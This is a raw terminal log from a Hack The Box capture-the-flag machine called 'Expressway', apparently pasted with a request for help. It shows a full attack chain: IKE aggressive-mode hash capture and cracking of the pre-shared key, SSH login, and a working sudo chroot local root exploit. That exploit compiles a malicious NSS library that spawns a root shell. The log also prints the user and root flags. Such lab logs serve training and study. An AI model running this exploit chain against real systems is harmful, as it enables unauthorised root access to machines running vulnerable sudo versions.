@@ -1,0 +1,125 @@
+this is  Expressway HTB ctf help me to solve it 
+
+kali@kali:/usr/share/nmap/scripts$ nmap 10.10.11.87 -A -p 500 -sU
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-25 03:50 EDT
+Nmap scan report for 10.10.11.87
+Host is up (0.28s latency).
+
+PORT    STATE SERVICE VERSION
+500/udp open  isakmp?
+| ike-version: 
+|   attributes: 
+|     XAUTH
+|_    Dead Peer Detection v1.0
+Too many fingerprints match this host to give specific OS details
+Network Distance: 2 hops
+
+TRACEROUTE (using port 443/tcp)
+HOP RTT       ADDRESS
+1   186.63 ms 10.10.16.1
+2   351.86 ms 10.10.11.87
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 131.44 seconds
+                                                                                                                                                                                             
+kali@kali:/usr/share/nmap/scripts$ 
+
+kali@kali:/usr/share/nmap/scripts$ ike-scan -P -M -A -n fakeID  10.10.11.87
+Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
+10.10.11.87     Aggressive Mode Handshake returned
+        HDR=(CKY-R=2a36013e03fd61c0)
+        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
+        KeyExchange(128 bytes)
+        Nonce(32 bytes)
+        ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
+        VID=09002689dfd6b712 (XAUTH)
+        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
+        Hash(20 bytes)
+
+IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):
+7978155aa52ccfffd7fe3dffe8e3c9f2fed7d2796398d6b2a72193ee624594052bcb03d3df26fd8836e10e181f85c998e1188101d1a5836253610b19261e827386112c050b587549534596aa7c16e36443f38752b5178893e4edbf30dd094845b950bb86e340c180c201b01f29af93de41bdbd79e9cd8d747d4fe78cd2f21946:b771683adb68b4ce229d6409e301ce49e18463d87a154550be6ec8a0facceeb02e8386bca12eca20df6df19b44c591cbed30085eee7c41ec69976a4459ae064f97b9bed7e471418cccbfd719a305ec83f70a6437d6c7b572667b1ed9df137159910c7cddd351c33976b4da400df54aaa9d2bb7d1877203f43da87d93b1babe32:2a36013e03fd61c0:9fb74ce865407015:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:10eacab6c8bdbd7fe2d44c9af55e675121419cb6:5d999e7c2121a4fe50ed4b70c056ae3b3e08c68bb91f0d55ea5a8288ab641a84:b79211156ec37fe052accb9fa1a115425cfd4246
+Ending ike-scan 1.9.6: 1 hosts scanned in 0.304 seconds (3.28 hosts/sec).  1 returned handshake; 0 returned notify
+                                                                                                                      
+                                                                                                                                                                                             
+kali@kali:~/Desktop$ psk-crack --dictionary /usr/share/wordlists/rockyou.txt psk.txt 
+Starting psk-crack [ike-scan 1.9.6] (http://www.nta-monitor.com/tools/ike-scan/)
+Running in dictionary cracking mode
+key "freakingrockstarontheroad" matches SHA1 hash b79211156ec37fe052accb9fa1a115425cfd4246
+Ending psk-crack: 8045040 iterations in 11.115 seconds (723787.77 iterations/sec)
+                                                                                                                                                                                             
+kali@kali:~/Desktop$ ike-scan -A -n ike@expressway.htb --psk=freakingrockstarontheroad 10.10.11.87
+
+Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
+10.10.11.87     Aggressive Mode Handshake returned HDR=(CKY-R=3ff099bfe747ef40) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)
+
+Ending ike-scan 1.9.6: 1 hosts scanned in 0.539 seconds (1.86 hosts/sec).  1 returned handshake; 0 returned notify
+
+
+kali@kali:~/Desktop$ nmap -sU -p 69 --script tftp-enum 10.10.11.87
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-25 04:45 EDT
+Stats: 0:00:42 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 0.00% done
+Nmap scan report for 10.10.11.87
+Host is up (0.20s latency).
+
+PORT   STATE SERVICE
+69/udp open  tftp
+| tftp-enum: 
+|_  ciscortr.cfg
+
+Nmap done: 1 IP address (1 host up) scanned in 129.33 seconds
+                                                                                                                                                                                             
+kali@kali:~/Desktop$ ssh ike@10.10.11.87
+The authenticity of host '10.10.11.87 (10.10.11.87)' can't be established.
+ED25519 key fingerprint is SHA256:fZLjHktV7oXzFz9v3ylWFE4BS9rECyxSHdlLrfxRM8g.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.11.87' (ED25519) to the list of known hosts.
+ike@10.10.11.87's password: 
+Last login: Sat Oct 25 09:22:41 BST 2025 from 10.10.14.54 on ssh
+Linux expressway.htb 6.16.7+deb14-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.16.7-1 (2025-09-11) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sat Oct 25 09:50:35 2025 from 10.10.16.6
+ike@expressway:~$ ls
+sudo-chwoot.sh  user.txt
+ike@expressway:~$ cat user.txt 
+0e8d94f82df7672c527d21b3587d60a8
+ike@expressway:~$ ls -l /usr/local/bin/sudo
+-rwsr-xr-x 1 root root 1047040 Aug 29 15:18 /usr/local/bin/sudo
+ike@expressway:~$ 
+ike@expressway:~$ /usr/local/bin/sudo -V | head -n1
+Sudo version 1.9.17
+ike@expressway:~$ STAGE=$(mktemp -d /tmp/sudowoot.XXXXXX); cd "$STAGE"
+ike@expressway:/tmp/sudowoot.JP39ma$ 
+ike@expressway:/tmp/sudowoot.JP39ma$ cat > woot1337.c <<'EOF'
+> #include <stdlib.h>
+#include <unistd.h>
+__attribute__((constructor)) void woot(void){
+    setreuid(0,0); setregid(0,0);
+    chdir("/"); execl("/bin/bash","bash","-p",NULL);
+}
+EOF
+ike@expressway:/tmp/sudowoot.JP39ma$ mkdir -p woot/etc libnss_
+ike@expressway:/tmp/sudowoot.JP39ma$ echo "passwd: /woot1337" > woot/etc/nsswitch.conf
+ike@expressway:/tmp/sudowoot.JP39ma$ cp /etc/group woot/etc 
+ike@expressway:/tmp/sudowoot.JP39ma$ gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c
+ike@expressway:/tmp/sudowoot.JP39ma$ /usr/local/bin/sudo -R woot woot
+root@expressway:/# cat /root/root.txt
+3498ba1c6a4838d7b3fff89f915de53a
+root@expressway:/# cd /
+bin/        dev/        home/       lib64/      media/      opt/        root/       sbin/       sys/        usr/        
+boot/       etc/        lib/        lost+found/ mnt/        proc/       run/        srv/        tmp/        var/        
+root@expressway:/# cd /home/ike/
+root@expressway:~# ls
+sudo-chwoot.sh  user.txt
+root@expressway:~# cat user.txt 
+0e8d94f82df7672c527d21b3587d60a8
+root@expressway:~# 
+
+                                                                                                                          
